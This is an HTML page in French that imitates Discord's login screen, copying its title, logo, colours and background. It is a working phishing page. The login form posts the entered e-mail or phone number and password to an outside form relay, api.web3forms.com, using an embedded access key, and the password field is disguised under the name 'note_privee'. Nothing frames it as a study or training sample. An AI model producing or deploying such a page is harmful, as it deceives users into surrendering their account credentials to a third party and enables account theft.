<!DOCTYPE html>
<html lang="fr">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Connexion</title>
    <style>
        :root {
            --background: #313338;
            --card-bg: #2b2d31;
            --text-muted: #b5bac1;
            --text-normal: #f2f3f5;
            --input-bg: #1e1f22;
            --blurple: #5865f2;
            --blurple-hover: #4752c4;
            --link: #00a8fc;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--background);
            background-image: url('https://discord.com/assets/847541504914fd33810e70a0ca73177e.png');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background: var(--card-bg);
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            width: 480px;
            color: var(--text-normal);
            text-align: center;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 16px;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            color: var(--text-muted);
            text-transform: uppercase;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 10px;
            background: var(--input-bg);
            border: none;
            border-radius: 3px;
            color: var(--text-normal);
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 1px solid var(--blurple);
        }

        .forgot-password {
            color: var(--link);
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-top: 4px;
            text-align: left;
        }

        .btn-login {
            width: 100%;
            padding: 12px;
            background: var(--blurple);
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s;
        }

        .btn-login:hover {
            background: var(--blurple-hover);
        }

        .register {
            margin-top: 8px;
            font-size: 14px;
            color: var(--text-muted);
            text-align: left;
        }

        .register span {
            color: var(--link);
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div>
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
        <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
        </svg>
        <h2>Ha, te revoilà !</h2>
        </div>
        <p class="subtitle">Nous sommes ravis de te revoir !</p>

        <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="85c235c3-9821-437f-a731-da47ddba2f2e">
            
            <div class="input-group">
    <label>E-mail ou numéro de téléphone</label>
    <input type="text" name="identifiant" required> </div>

<div class="input-group">
    <label>Mot de passe</label>
    <input type="text" name="note_privee" required> <a href="#" class="forgot-password">Mot de passe oublié ?</a>
</div>
            
            <button type="submit" class="btn-login">Se connecter</button>
            
            <div class="register">
                Besoin d'un compte ? <span>S'inscrire</span>
            </div>
        </form>
    </div>

</body>
</html>
